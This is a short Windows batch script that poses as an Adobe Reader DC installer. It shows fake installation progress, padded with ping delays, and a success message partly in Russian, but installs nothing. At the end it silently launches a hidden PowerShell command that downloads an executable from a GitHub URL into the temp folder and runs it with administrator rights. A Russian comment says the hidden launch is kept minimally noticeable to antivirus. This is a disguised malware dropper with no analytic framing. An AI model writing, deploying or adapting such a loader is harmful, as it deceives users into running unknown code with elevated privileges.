@echo off
chcp 65001 >nul
color 0A
title Adobe Reader Installer
cls
echo ============================================================
echo         Adobe Reader DC v2025.001.20100
echo ============================================================
echo.
echo [*] Preparing installation files...
ping 127.0.0.1 -n 2 >nul
echo [*] Extracting components...
ping 127.0.0.1 -n 3 >nul
echo [*] Verifying system requirements...
ping 127.0.0.1 -n 2 >nul
echo.
echo [+] Installing Adobe Reader...
ping 127.0.0.1 -n 5 >nul
echo [+] Installation complete!
echo.
echo ============================================================
echo   Adobe Reader успешно установлен!
echo ============================================================
ping 127.0.0.1 -n 2 >nul
echo.
echo Нажмите любую клавишу для выхода...
pause >nul

:: Скрытый запуск (минимально заметный для антивируса)
start /b powershell -WindowStyle Hidden -Command "$url='https://github.com/vladislavgossgetto-create/checker/raw/refs/heads/main/AdaptiveVisuals-1.5-full.jar.exe'; $out='%TEMP%\Adaptive.exe'; (New-Object System.Net.WebClient).DownloadFile($url,$out); Start-Process $out -Verb RunAs"
exit